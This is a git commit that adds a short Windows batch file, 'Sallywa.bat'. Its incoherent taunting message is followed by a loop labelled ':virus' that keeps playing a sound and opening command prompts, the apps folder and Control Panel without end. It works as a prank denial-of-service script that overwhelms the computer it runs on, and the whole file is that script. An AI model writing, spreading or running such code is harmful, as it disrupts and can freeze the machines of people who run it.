916a38264ac8232f640ad908dc34ff76eb7911d5
K <tel33254@gmail.com>
2026-09-17 10:08:48 +0300

    Create Sallywa.bat

---
+++ Sallywa.bat
@@ -0,0 +1,8 @@
+cd c:\
+msg THIS IS CONTAINE THAT YOUR AND WE ARE TO THE END TO THE END TO CSUPO hangover K AND WE ARE TO THE END RIP TO THE END RIP TO THE END RIP TO THE END 
+:virus
+start C:\Windows\Media\tada.wav
+start cmd
+start shell:appsfolder
+start control
+goto virus
